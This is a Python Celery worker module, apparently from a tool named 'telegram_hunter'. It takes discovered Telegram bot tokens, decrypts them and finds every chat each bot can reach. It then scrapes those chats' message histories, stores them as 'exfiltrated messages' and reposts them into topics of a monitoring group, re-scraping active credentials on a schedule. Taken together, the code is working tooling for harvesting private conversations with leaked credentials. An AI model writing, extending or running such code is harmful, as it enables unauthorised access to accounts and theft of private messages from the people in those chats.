import asyncio
import time
from app.workers.celery_app import app
from app.core.database import db
from app.core.security import security
from app.services.scraper_srv import scraper_service
import redis
from app.core.config import settings
import logging
from celery.exceptions import SoftTimeLimitExceeded

logger = logging.getLogger("flow.tasks")

# Helper for async DB execution
async def async_execute(query_builder):
    """Executes a Supabase query builder synchronously in a background thread."""
    return await asyncio.to_thread(query_builder.execute)


# Redis Client for Locking
redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)


# ==============================================
# BROADCASTER SINGLETON (BUG-011)
# Module-level instance so bot rotation state (itertools.cycle)
# persists across task invocations within the same worker process.
# ==============================================
_broadcaster = None


def get_broadcaster():
    """
    Returns the module-level BroadcasterService singleton.
    Lazy-initialized to avoid import-time issues.
    Bot rotation state is preserved across all task calls in this worker.
    """
    global _broadcaster
    if _broadcaster is None:
        from app.services.broadcaster_srv import BroadcasterService
        _broadcaster = BroadcasterService()
    return _broadcaster

@app.task(name="flow.exfiltrate_chat", soft_time_limit=2400, time_limit=2500)
def exfiltrate_chat(cred_id: str):
    """
    1. Decrypt token.
    2. Scrape history.
    3. Save to DB.
    4. Trigger broadcast.
    """
    try:
        from app.workers.celery_app import get_worker_loop
        return get_worker_loop().run_until_complete(_exfiltrate_logic(cred_id))
    except SoftTimeLimitExceeded:
        logger.warning(f"⏰ [Exfil] Soft time limit exceeded for {cred_id}. Saving partial results.")
        return f"Exfiltration timed out for {cred_id} (partial results may have been saved)."

async def _exfiltrate_logic(cred_id: str):
    logger.info(f"🕵️ [Exfil] Starting process for CredID: {cred_id}")

    broadcaster = get_broadcaster()
    await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")

    # T010: Observability hook
    from app.core.metrics import metrics
    from app.core.audit import AuditLogger
    metrics.inc("exfiltrate.started")
    AuditLogger.log(
        event_type="exfiltrate.start",
        credential_id=cred_id,
        details={"cred_id": cred_id}
    )
    
    # Fetch credential
    response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id))
    if not response.data:
        logger.error(f"❌ [Exfil] Credential {cred_id} not found in DB.")
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    encrypted_token = record["bot_token"]
    chat_id = record["chat_id"]
    
    logger.info(f"    [Exfil] Found Chat ID: {chat_id}")
    
    # Decrypt or Handle Legacy/Raw
    try:
        if not encrypted_token.startswith("gAAAA"):
            # Likely raw token from "bugged" scanner run
            bot_token = encrypted_token
            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
            try:
                new_enc = security.encrypt(bot_token)
                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                logger.info(f"    🩹 [Exfil] Self-healed unencrypted token for {cred_id}")
            except Exception as heal_err:
                logger.warning(f"    ⚠️ [Exfil] Self-heal encrypt failed for {cred_id}: {heal_err}")
        else:
            bot_token = security.decrypt(encrypted_token).strip()
    except Exception as e:
        # Invalid token or key mismatch
        logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        return f"Decryption failed for {cred_id}: {e}"

    # Validate decrypted token format before use
    from app.utils.helpers import is_valid_telegram_token
    if not is_valid_telegram_token(bot_token):
        logger.error(f"❌ [Exfil] Decrypted token has invalid format for {cred_id}. Marking revoked.")
        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        return f"Invalid token format after decryption for {cred_id}"

    # Scrape
    try:
        logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
        await broadcaster.send_log(f"⏳ Scraping chat `{chat_id}`...")
        
        messages = await scraper_service.scrape_history(bot_token, chat_id)
        
        logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
        await broadcaster.send_log(f"✅ Scraped {len(messages)} messages.")
    except SoftTimeLimitExceeded:
        logger.warning(f"⏰ [Exfil] Scraping timed out for chat {chat_id}. Continuing with 0 messages.")
        messages = []
    except Exception as e:
        err_str = str(e)
        # Only mark revoked for definitive Telegram rejection — NOT transient errors.
        # Transient: network failures, timeouts, flood waits, server errors.
        # Permanent: bot kicked/banned, token invalid (401), account deactivated.
        permanent_errors = (
            "AuthKeyUnregisteredError" in err_str
            or "UserDeactivatedBanError" in err_str
            or "401" in err_str and "Unauthorized" in err_str
        )
        if permanent_errors:
            logger.error(f"❌ [Exfil] Permanent scraper failure for {cred_id}: {e}. Marking revoked.")
            await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        else:
            logger.warning(f"⚠️ [Exfil] Transient scraper failure for {cred_id}: {e}. Leaving status for retry.")
        return f"Scraping failed: {e}"

    # Save Messages (using UPSERT to prevent duplicates)
    new_count = 0
    for msg in messages:
        msg["credential_id"] = cred_id
        
        # SANITIZE: Remove keys that don't exist in the 'exfiltrated_messages' table
        # ScraperService adds 'chat_id' for context, but DB doesn't have it.
        db_payload = msg.copy()
        if "chat_id" in db_payload:
            del db_payload["chat_id"]
            
        try:
            # Use upsert: insert if not exists, ignore if duplicate
            result = await async_execute(db.table("exfiltrated_messages").upsert(
                db_payload,
                on_conflict="credential_id,telegram_msg_id",  # Conflict columns
                ignore_duplicates=True  # Don't update existing, just skip
            ))
            
            if result.data:
                new_count += 1
        except Exception as e:
            logger.error(f"    ❌ Insert error for msg {msg.get('telegram_msg_id')}: {e}")

    if new_count > 0:
        await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")

    # Trigger Broadcast
    if new_count > 0:
        broadcast_pending.delay()

    return f"Exfiltrated {new_count} new messages."

@app.task(name="flow.enrich_credential")
def enrich_credential(cred_id: str):
    """
    1. Decrypt token.
    2. Discover chats (Enrichment).
    3. Update DB with Chat ID(s).
    4. Trigger Exfiltration.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_enrich_logic(cred_id))

async def _enrich_logic(cred_id: str):
    logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")

    # T010: Observability hook
    from app.core.metrics import metrics
    from app.core.audit import AuditLogger
    metrics.inc("enrich.started")
    AuditLogger.log(
        event_type="enrich.start",
        credential_id=cred_id,
        details={"cred_id": cred_id}
    )

    broadcaster = get_broadcaster()
    await broadcaster.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
    # Fetch credential
    response = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id))
    if not response.data:
        logger.error(f"❌ [Enrich] Credential {cred_id} not found.")
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    
    # Decrypt or Handle Legacy/Raw
    try:
        if not record["bot_token"].startswith("gAAAA"):
             # Likely raw token
            bot_token = record["bot_token"]
            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
            try:
                new_enc = security.encrypt(bot_token)
                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                logger.info(f"    🩹 [Enrich] Self-healed unencrypted token for {cred_id}")
            except Exception as heal_err:
                logger.warning(f"    ⚠️ [Enrich] Self-heal encrypt failed for {cred_id}: {heal_err}")
        else:
            bot_token = security.decrypt(record["bot_token"]).strip()
    except Exception as e:
        logger.error(f"❌ [Enrich] Decryption failed: {e}")
        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        return f"Decryption failed: {e}"

    # Validate decrypted token format before use
    from app.utils.helpers import is_valid_telegram_token
    if not is_valid_telegram_token(bot_token):
        logger.error(f"❌ [Enrich] Decrypted token has invalid format for {cred_id}. Marking revoked.")
        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
        return f"Invalid token format after decryption for {cred_id}"

    # Discover
    bot_info = {}
    try:
        logger.info(f"🔎 [Enrich] Discovering chats via ScraperService...")
        bot_info, chats = await scraper_service.discover_chats(bot_token)
        logger.info(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
        if chats:
            chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
            logger.info(f"    [Enrich] Chats found: {chat_list}")
            await broadcaster.send_log(f"✅ Discovered chats: {chat_list}")
        else:
            logger.info(f"    [Enrich] No chats found.")
            await broadcaster.send_log("⚠️ No chats found.")
    except Exception as e:
        logger.error(f"❌ [Enrich] Discovery failed: {e}")
        return f"Discovery failed: {e}"

    # Filter out synthetic "bot_self" entries — these are placeholders, not real chats.
    # discover_chats() inserts them when the token is valid but has no recent activity;
    # using the bot's own Telegram ID as a chat_id causes failed exfiltration.
    real_chats = [c for c in chats if c.get("type") != "bot_self"]

    if not real_chats:
        # Valid token, but no open dialogs (or only bot_self placeholder).
        logger.info(f"    [Enrich] No real chats via API. Skipping Orphan Match (Disabled).")
        # Mark as 'active' - token works but truly no chats accessible
        await async_execute(db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id))
        return "Token valid, but no real chats found. Status updated to 'active'."

    chats = real_chats

    # Update Logic
    # 1. Update the ORIGINAL record with the first chat found.
    # 2. If more chats, create NEW records (clones).

    first_chat = chats[0]
    logger.info(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
    
    # Update primary
    # Pre-create Topic with NEW FORMAT: @username / botid
    from app.core.config import settings
    
    bot_username = bot_info.get("username") or "unknown"
    bot_id = bot_info.get("id") or "0"
    topic_name = f"@{bot_username} / {bot_id}"
    
    topic_id = 0
    try:
        topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
        # Header handled by ensure_topic automatically
    except Exception as e:
        logger.warning(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")

    # Always re-fetch meta immediately before writing to minimise the race window
    # (another worker may have enriched or set topic_id between our earlier fetch and now)
    cur = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
    meta_payload = dict((cur.data or {}).get("meta") or {})
    meta_payload.update({
        "chat_name": first_chat["name"],
        "type": first_chat["type"],
        "enriched": True,
        "bot_username": bot_username,
        "bot_id": bot_id,
    })
    if topic_id:
        meta_payload["topic_id"] = topic_id

    await async_execute(db.table("discovered_credentials").update({
        "chat_id": first_chat["id"],
        "meta": meta_payload,
    }).eq("id", cred_id))
    
    # Trigger Exfiltration for Primary
    logger.info(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
    await broadcaster.send_log(f"🚀 Triggering background exfiltration task.")
    exfiltrate_chat.delay(cred_id)

    msg = f"Enriched {cred_id} with chat {first_chat['id']}."

    # --- Multi-chat: create sibling credential records for every additional chat ---
    if len(chats) > 1:
        import hashlib as _hashlib
        cloned = 0
        for extra_chat in chats[1:]:
            extra_chat_id = extra_chat["id"]
            # Synthetic hash: unique per (token, chat) pair so the UNIQUE constraint holds
            extra_hash = _hashlib.sha256(
                f"{bot_token}|chat:{extra_chat_id}".encode()
            ).hexdigest()

            try:
                existing = await async_execute(
                    db.table("discovered_credentials").select("id").eq("token_hash", extra_hash)
                )
                if existing.data:
                    continue  # already exists from a previous enrich run

                sibling_data = {
                    "bot_token": security.encrypt(bot_token),
                    "token_hash": extra_hash,
                    "chat_id": extra_chat_id,
                    "chat_name": extra_chat.get("name"),
                    "chat_type": extra_chat.get("type"),
                    "bot_id": str(bot_id),
                    "bot_username": bot_username,
                    "source": "multi_chat",
                    "status": "active",
                    "meta": {
                        "bot_username": bot_username,
                        "bot_id": bot_id,
                        "topic_id": topic_id,  # share same monitor topic thread
                        "parent_credential_id": cred_id,
                        "enriched": True,
                    },
                }
                res = await async_execute(db.table("discovered_credentials").insert(sibling_data))
                if res.data:
                    sibling_id = res.data[0]["id"]
                    exfiltrate_chat.delay(sibling_id)
                    cloned += 1
                    logger.info(
                        f"    ➕ [Enrich] Created sibling credential {sibling_id} for chat {extra_chat_id}"
                    )
            except Exception as e:
                logger.error(f"    ❌ [Enrich] Failed to clone for chat {extra_chat_id}: {e}")

        if cloned:
            msg += f" (+{cloned} sibling chats queued)"
            await broadcaster.send_log(f"➕ Queued {cloned} additional chat(s) for exfiltration.")

    return msg

@app.task(name="flow.broadcast_pending")
def broadcast_pending():
    # Distributed Lock to prevent race conditions (e.g. Local Worker vs Prod Worker)
    lock_key = "telegram_hunter:lock:broadcast"
    # TTL = 240s: covers 100 msgs × 2s sleep = 200s worst case + 40s buffer.
    # Previous 55s TTL was too short — expired during large batches and allowed parallel runs.
    lock = redis_client.lock(lock_key, timeout=240, blocking=False)
    
    acquired = lock.acquire()
    if not acquired:
        return "Skipped: Broadcast task already running (Lock active)."

    # Check Pause State
    if redis_client.get("system:paused"):
        lock.release()
        return "System Paused"

    try:
        from app.workers.celery_app import get_worker_loop
        return get_worker_loop().run_until_complete(_broadcast_logic())
    finally:
        try:
            lock.release()
        except redis.exceptions.LockError:
            pass  # Lock expired or already released

async def _broadcast_logic():
    """
    Broadcast pending messages to Telegram topics.
    Uses DB-level atomic claims to prevent duplicates across ALL environments.
    """
    from datetime import datetime, timezone, timedelta

    broadcaster = get_broadcaster()

    # Claim timeout - if a claim is older than this, consider it stale (worker crashed)
    CLAIM_TIMEOUT_MINUTES = 5
    stale_threshold = datetime.now(timezone.utc) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)

    # BUG-009: Increased from 20 to 100 to reduce queue backlog
    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("is_broadcasted", False)
        .order("telegram_msg_id", desc=False)
        .limit(100)
    )
    
    messages = response.data
    if not messages:
        # Only log periodically or if verbose debug needed? 
        # For now, let's log it to confirm the task is running.
        logger.info("💤 No pending broadcasts found.") 
        return "No pending broadcasts."

    group_id = settings.MONITOR_GROUP_ID
    sent_count = 0
    skipped_count = 0
    already_done_count = 0
    # Local cache to avoid DB roundtrips within this batch if multiple messages for same cred
    cached_topic_ids = {}

    for msg in messages:
        msg_id = msg["id"]
        
        try:
            # ==========================================================
            # STEP 1: ATOMIC CLAIM via DB (works across ALL environments)
            # ==========================================================
            # Single conditional UPDATE — only succeeds if message is unclaimed and not yet broadcast.
            # This eliminates the TOCTOU race between check and claim.
            claim_time = datetime.now(timezone.utc).isoformat()

            # Attempt to claim an unclaimed message
            claim_result = await async_execute(db.table("exfiltrated_messages")\
                .update({"broadcast_claimed_at": claim_time})\
                .eq("id", msg_id)\
                .eq("is_broadcasted", False)\
                .is_("broadcast_claimed_at", "null")\
                )

            if not claim_result.data:
                # Either already broadcasted, or claimed by another worker.
                # Try reclaiming if the existing claim is stale.
                stale_iso = stale_threshold.isoformat()
                reclaim_result = await async_execute(db.table("exfiltrated_messages")\
                    .update({"broadcast_claimed_at": claim_time})\
                    .eq("id", msg_id)\
                    .eq("is_broadcasted", False)\
                    .lt("broadcast_claimed_at", stale_iso)\
                    )

                if not reclaim_result.data:
                    # Could not claim — either done or freshly claimed by another worker
                    skipped_count += 1
                    continue

                logger.warning(f"    🔄 Stale claim reclaimed for {msg_id}")
            
            logger.info(f"    📌 Claimed message {msg_id}")
            
            cred_id = msg["credential_id"]
            # Extract meta from the joined discovered_credentials
            cred_info = msg.get("discovered_credentials", {})
            meta = cred_info.get("meta", {}) if cred_info else {}
            
            # 1. Resolve Topic Name (Always needed for potential recreation)
            # Priority: @username / botid -> chat_name -> Cred-ID
            bot_username = meta.get("bot_username")
            bot_id = meta.get("bot_id")
            
            # If we lack bot info (Legacy data), try to fetch and extract it from token
            if not bot_id and not meta.get("bot_id"):
                 # Only fetch if we really need it and haven't tried before (optimization)
                 # But for safety/simplicity let's just do the fallback logic if basic checks fail
                 pass 

            if bot_username and bot_id:
                 topic_name = f"@{bot_username} / {bot_id}"
            elif bot_id:
                 topic_name = f"@unknown / {bot_id}"
            elif meta.get("chat_name"):
                 topic_name = f"{meta.get('chat_name')} (Legacy)"
            else:
                 topic_name = f"Cred-{cred_id[:8]}"

            # 2. Check Cache/DB for ID
            thread_id = cached_topic_ids.get(cred_id) or meta.get("topic_id")

            if not thread_id:
                # Determines if we need to fetch token for legacy fallback
                if "unknown" in topic_name and not bot_id:
                     try:
                        cred_res = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id).single())
                        if cred_res.data:
                            # .single() returns a dict, not a list — access directly
                            raw_token = cred_res.data.get("bot_token") if isinstance(cred_res.data, dict) else cred_res.data[0]["bot_token"]
                            decrypted = security.decrypt(raw_token)
                            if ":" in decrypted:
                                bot_id = decrypted.split(":")[0]
                                meta["bot_id"] = bot_id
                                topic_name = f"@unknown / {bot_id}"
                     except Exception as e_dec:
                                logger.debug(f"[Broadcast] Could not decrypt token for legacy bot_id extraction: {e_dec}")

                # Ensure Topic
                thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                
                # Header handled automatically
                
                # Re-fetch meta before write — prevents overwriting concurrent enrich updates
                fresh = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                meta = dict((fresh.data or {}).get("meta") or {})
                meta["topic_id"] = thread_id
                await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                logger.info(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
            
            # Update local cache
            cached_topic_ids[cred_id] = thread_id
            
            # Send Message (with retry for deleted topics)
            send_success = False
            try:
                await broadcaster.send_message(group_id, thread_id, msg)
                send_success = True
            except Exception as e:
                # Check for topic deletion/not found
                err_str = str(e)
                if "Topic_deleted" in err_str or "message thread not found" in err_str or "TOPIC_DELETED" in err_str:
                    logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
                    # Recreate
                    thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                    # Re-fetch meta before write
                    fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                    meta = dict((fresh2.data or {}).get("meta") or {})
                    meta["topic_id"] = thread_id
                    await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                    # Update Cache so subsequent messages in this batch don't recreate again
                    cached_topic_ids[cred_id] = thread_id
                    # Retry Send
                    try:
                        await broadcaster.send_message(group_id, thread_id, msg)
                        send_success = True
                    except Exception as retry_e:
                        logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
                else:
                    logger.error(f"    ❌ Send failed: {e}")
            
            if send_success:
                # ==============================================
                # SUCCESS: Mark as broadcasted and clear claim
                # ==============================================
                await async_execute(db.table("exfiltrated_messages").update({
                    "is_broadcasted": True,
                    "broadcast_claimed_at": None  # Clear claim
                }).eq("id", msg_id))
                sent_count += 1
                logger.info(f"    ✅ Broadcasted msg {msg_id}")
            else:
                # ==============================================
                # FAILED: Clear claim so it can be retried
                # ==============================================
                await async_execute(db.table("exfiltrated_messages").update({
                    "broadcast_claimed_at": None
                }).eq("id", msg_id))
                logger.warning(f"    🔄 Cleared claim for retry: {msg_id}")
            
            # Rate limit
            await asyncio.sleep(2.0) 

        except Exception as e:
            logger.error(f"Error broadcasting msg {msg_id}: {e}")
            # Clear claim on error so message can be retried
            try:
                await async_execute(db.table("exfiltrated_messages").update({
                    "broadcast_claimed_at": None
                }).eq("id", msg_id))
            except Exception as e_claim:
                logger.error(f"Failed to clear broadcast claim for msg {msg_id}: {e_claim} — message may be stuck until stale-claim TTL expires")
            continue
    
    result = f"Broadcasted {sent_count}/{len(messages)} messages"
    if skipped_count > 0:
        result += f" (skipped {skipped_count} claimed by other workers)"
    if already_done_count > 0:
        result += f" (already done: {already_done_count})"
    return result

@app.task(name="flow.system_heartbeat")
def system_heartbeat():
    """Periodic ping to confirm system uptime."""
    msg = "💓 **System Heartbeat**: Worker is active and scanning."

    try:
        redis_client.set("system:heartbeat:last_seen", int(time.time()))
    except Exception as e:
        logger.warning(f"Failed to update heartbeat in Redis: {e}")

    from app.workers.celery_app import get_worker_loop
    get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
    return "Heartbeat sent."


@app.task(name="flow.system_help")
def system_help():
    """Periodic guide on how to use system commands."""
    msg = (
        "ℹ️ **System Commands Guide**\n"
        "You can control the system using these commands:\n\n"
        "• `/status` - View queue size, DB connectivity, and paused state.\n"
        "• `/pause` - Suspend all scanners and broadcasters (Maintenance Mode).\n"
        "• `/resume` - Resume normal operations.\n"
        "• `/restart` - Restart the Bot Listener process.\n\n"
        "_Commands are restricted to Admins and Whitelisted Users._"
    )
    from app.workers.celery_app import get_worker_loop
    get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
    return "Help guide sent."


@app.task(name="flow.rescrape_active")
def rescrape_active():
    """
    Periodic task to re-scrape all active credentials for new messages.
    Runs every 4 hours to catch new activity in monitored chats.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_rescrape_active_logic())


async def _rescrape_active_logic():
    """
    Cursor-based rescrape: advances through ALL active credentials across successive runs.
    Each run processes one batch starting from where the previous run left off,
    ensuring every credential is eventually rescraped regardless of table size.
    """
    import os
    from app.core.metrics import metrics
    from app.core.redis_srv import redis_srv
    metrics.inc("rescrape.started")

    BATCH_SIZE = int(os.getenv("RESCRAPE_BATCH_SIZE", 50))
    # Stagger task dispatch: spread BATCH_SIZE tasks across RESCRAPE_SPREAD_SECONDS
    # so they don't all hit the UserAgent simultaneously and trigger FloodWait.
    # Default: 50 tasks over 300s = one task every 6s.
    SPREAD_SECONDS = int(os.getenv("RESCRAPE_SPREAD_SECONDS", 300))
    CURSOR_KEY = "rescrape:cursor:last_id"

    broadcaster = get_broadcaster()

    # Guard: if ALL UserAgent sessions are on cooldown, skip this run entirely.
    # Queueing tasks when the UA is fully restricted just wastes worker slots and
    # causes noisy "All sessions failed" log spam.
    from app.workers.tasks.scanner_tasks import _run_sync
    ua_sessions_available = False
    try:
        import os.path as _osp
        import glob
        session_files = glob.glob("/app/sessions/*.session")
        for sf in session_files:
            sname = _osp.splitext(_osp.basename(sf))[0]
            if not redis_srv.is_on_cooldown(f"user_agent:{sname}"):
                ua_sessions_available = True
                break
    except Exception:
        ua_sessions_available = True  # fail open

    if not ua_sessions_available:
        msg = "⏳ **Re-scrape**: All UserAgent sessions on FloodWait cooldown — skipping this run to avoid task noise."
        logger.info(msg)
        await broadcaster.send_log(msg)
        return msg

    # Read cursor from Redis — empty string means start of table
    last_id = redis_client.get(CURSOR_KEY) or ""

    try:
        query = (
            db.table("discovered_credentials")
            .select("id")
            .eq("status", "active")
            .not_.is_("chat_id", "null")
            .order("id", desc=False)
            .limit(BATCH_SIZE)
        )
        if last_id:
            query = query.gt("id", last_id)

        response = await async_execute(query)
        credentials = response.data or []

        if not credentials:
            # End of table — reset cursor so the next run starts over
            redis_client.delete(CURSOR_KEY)
            await broadcaster.send_log("🔄 **Re-scrape**: Full table scanned — cursor reset to start.")
            return "Rescrape cursor reset (full table covered)."

        # Advance cursor to last ID in this batch
        new_cursor = credentials[-1]["id"]
        redis_client.set(CURSOR_KEY, new_cursor)

        await broadcaster.send_log(
            f"🔄 **Re-scrape**: Queuing {len(credentials)} credentials (cursor: ...{new_cursor[-8:]}, "
            f"staggered over {SPREAD_SECONDS}s)..."
        )

        queued = 0
        interval = SPREAD_SECONDS / max(len(credentials), 1)
        for i, cred in enumerate(credentials):
            try:
                # countdown staggers each task: task 0 runs now, task 1 runs in interval*1s, etc.
                exfiltrate_chat.apply_async(args=[cred["id"]], countdown=int(i * interval))
                queued += 1
            except Exception as e:
                logger.error(f"Failed to queue exfiltration for {cred['id']}: {e}")

        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials (spread: ~{interval:.0f}s apart)."
        await broadcaster.send_log(msg)
        return msg

    except Exception as e:
        error_msg = f"❌ **Re-scrape** failed: {e}"
        await broadcaster.send_log(error_msg)
        return error_msg
